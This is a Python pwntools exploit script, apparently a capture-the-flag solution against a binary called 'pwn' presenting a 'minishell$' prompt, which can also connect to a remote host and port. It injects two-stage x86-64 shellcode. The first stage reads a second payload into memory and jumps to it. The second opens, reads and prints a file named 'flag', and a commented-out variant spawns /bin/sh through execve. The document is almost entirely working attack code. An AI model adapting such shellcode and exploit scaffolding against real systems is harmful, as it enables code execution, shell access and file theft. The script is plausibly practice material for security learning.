from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("61.147.171.107", 42112)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b""
stage1 = asm('''
    mov rsi, 0x100000014
    xor rdi, rdi
    mov dh, 0x10
    syscall
    jmp rsi
''')

stage2 = asm('''
    mov rsp, 0x100000510
    mov rax, 0x67616c66   /* 'flag' */
    push rax
    mov rdi, rsp          /* 文件名指针 */
    
    /* 打开文件 */
    xor rsi, rsi          /* O_RDONLY */
    xor rdx, rdx
    mov rax, 2
    mov al, 2
    syscall
    
    /* 读取文件内容到栈缓冲区 */
    mov rdi, rax          /* 文件描述符 */
    lea rsi, [rsp-0x100]  /* 栈缓冲区地址 */
    mov rdx, 0x100        /* 读取256字节 */
    xor rax, rax
    syscall
    
    /* 输出到标准输出 */
    mov rdx, rax          /* 读取的字节数 */
    mov rdi, 1            /* stdout */
    lea rsi, [rsp-0x100]  /* 缓冲区地址 */
    mov rax, 1
    syscall
    
    /* 退出 */
    mov rax, 60
    xor rdi, rdi
    syscall
''')
# stage2 = asm('''
#     xor rsi, rsi
#     mov rsp, 0x4D1220
#     push rsi
#     mov rdi, 0x68732f2f6e69622f  /* /bin//sh */
#     push rdi
#     push rsp
#     pop rdi
#     push 0x3b
#     pop rax
#     cdq
#     syscall
#     ''')
ddebug("break *0x0401E6B\nb *0x100000011 \n continue")
io.sendlineafter(b"minishell$ ", b"cat")
pause()
io.sendline(stage1)
pause()
io.sendline(stage2)
io.interactive()
